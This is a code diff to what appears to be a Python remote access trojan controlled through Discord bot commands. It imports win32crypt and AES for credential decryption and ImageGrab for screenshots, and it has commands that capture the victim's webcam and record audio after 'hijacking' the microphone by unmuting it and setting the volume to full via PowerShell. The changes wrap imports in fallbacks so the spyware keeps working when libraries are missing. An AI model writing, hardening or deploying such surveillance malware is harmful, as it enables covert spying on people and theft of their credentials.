@@ -29,8 +29,14 @@ import win32crypt
 try:
     from Cryptodome.Cipher import AES
 except ImportError:
-    from Crypto.Cipher import AES
-from PIL import ImageGrab
+    try:
+        from Crypto.Cipher import AES
+    except ImportError:
+        AES = None
+try:
+    from PIL import ImageGrab
+except ImportError:
+    ImageGrab = None
 from discord.ext import commands
 
 def _d(s):
@@ -1165,7 +1171,11 @@ async def delete_bot_cmd(ctx):
 @bot.command()
 async def webcam(ctx):
     def _capture():
-        import cv2
+        try:
+            import cv2
+        except ImportError:
+            return "Error: OpenCV (cv2) not found in this environment."
+        
         # Try multiple camera indices in case 0 is busy or incorrect
         for index in [0, 1, 2, 3]:
             try:
@@ -1370,8 +1380,11 @@ async def shutdown(ctx):
 @bot.command()
 async def audiorec(ctx, seconds: int = 10):
     def _record():
-        import sounddevice as sd
-        import soundfile as sf
+        try:
+            import sounddevice as sd
+            import soundfile as sf
+        except ImportError:
+            return "Error: sounddevice/soundfile not found in this environment."
         
         # Hijack the microphone: Unmute and set volume to 100% via PowerShell
         ps_cmd = (
